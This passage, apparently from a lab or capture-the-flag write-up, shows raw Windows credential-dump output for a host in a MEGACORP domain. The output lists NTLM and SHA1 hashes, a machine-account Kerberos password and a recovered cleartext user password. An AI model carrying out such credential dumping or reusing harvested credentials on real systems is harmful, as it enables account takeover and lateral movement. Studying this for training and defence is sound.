		         * Username : sandra
		         * Domain   : MEGACORP
		         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
		         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
		         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
		        tspkg :
		        wdigest :
		         * Username : sandra
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : sandra
		         * Domain   : MEGACORP.LOCAL
		         * Password : Password1234!
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 183955 (00000000:0002ce93)
		Session           : Service from 0
		User Name         : DefaultAppPool
		Domain            : IIS APPPOOL
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:24 PM
		SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : SHIELD$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 183792 (00000000:0002cdf0)
		Session           : Service from 0
		User Name         : wordpress
		Domain            : IIS APPPOOL
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:24 PM
		SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : SHIELD$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 996 (00000000:000003e4)
		Session           : Service from 0
		User Name         : SHIELD$
		Domain            : MEGACORP
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:01 PM
		SID               : S-1-5-20
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : shield$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 995 (00000000:000003e3)
		Session           : Service from 0
		User Name         : IUSR
		Domain            : NT AUTHORITY
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:08 PM
		SID               : S-1-5-17
		        msv :
		        tspkg :
		        wdigest :
		         * Username : (null)
		         * Domain   : (null)
		         * Password : (null)
		        kerberos :
		         * Username : IUSR
		         * Domain   : NT AUTHORITY
		         * Password : (null)
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 997 (00000000:000003e5)
		Session           : Service from 0
		User Name         : LOCAL SERVICE
		Domain            : NT AUTHORITY
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:02 PM
		SID               : S-1-5-19
		        msv :
		        tspkg :
		        wdigest :
		         * Username : (null)
		         * Domain   : (null)
		         * Password : (null)
		        kerberos :
		         * Username : (null)
		         * Domain   : (null)
		         * Password : (null)
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 65711 (00000000:000100af)
		Session           : Interactive from 1
		User Name         : DWM-1
		Domain            : Window Manager
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:01 PM
		SID               : S-1-5-90-0-1
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : SHIELD$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 65691 (00000000:0001009b)
		Session           : Interactive from 1
		User Name         : DWM-1
		Domain            : Window Manager
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:01 PM
		SID               : S-1-5-90-0-1
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : SHIELD$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 36390 (00000000:00008e26)
		Session           : UndefinedLogonType from 0
		User Name         : (null)
		Domain            : (null)
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:00 PM
		SID               : 
		        msv :
		         [00000003] Primary
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * NTLM     : 9d4feee71a4f411bf92a86b523d64437
		         * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
		        tspkg :
		        wdigest :
		        kerberos :
		        ssp :
		        credman :
		
		Authentication Id : 0 ; 999 (00000000:000003e7)
		Session           : UndefinedLogonType from 0
		User Name         : SHIELD$
		Domain            : MEGACORP
		Logon Server      : (null)
		Logon Time        : 5/4/2020 10:19:00 PM
		SID               : S-1-5-18
		        msv :
		        tspkg :
		        wdigest :
		         * Username : SHIELD$
		         * Domain   : MEGACORP
		         * Password : (null)
		        kerberos :
		         * Username : shield$
		         * Domain   : MEGACORP.LOCAL
		         * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
		        ssp :
		        credman :
		```
		**Result: Credentials** `Sandra:Password1234!`.








